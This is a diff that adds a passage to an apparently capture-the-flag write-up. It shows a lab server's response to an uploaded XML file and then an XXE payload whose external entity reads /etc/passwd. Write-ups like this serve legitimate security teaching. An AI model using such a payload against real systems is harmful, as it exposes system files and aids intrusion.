@@ -19,5 +19,28 @@ Navigating to feed shows a static page and therefore nothing interesting however
   <Content>fieldraccoon</Content>
 </test>
 ```
-this is the data we add to our initial payload and we get a request back form the server. 
+this is the data we add to our initial payload and we get a request back form the server.
+```
+PROCESSED BLOGPOST: 
+  Author: fieldraccoon
+ Subject: fieldraccoon
+ Content: fieldraccoon
+ URL for later reference: /uploads/exploit.xml
+ File path: /home/roosa/deploy/src
+ ```
+ We see that there is a user called roosa in the file path. This is the user for this box. We now modify our payload to try and get code execution. This is the exploit:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+
+<test>
+  <Author>fieldraccoon</Author>
+  <Subject>&file;</Subject>
+  <Content>fieldraccoon</Content>
+</test>
+```
+
 
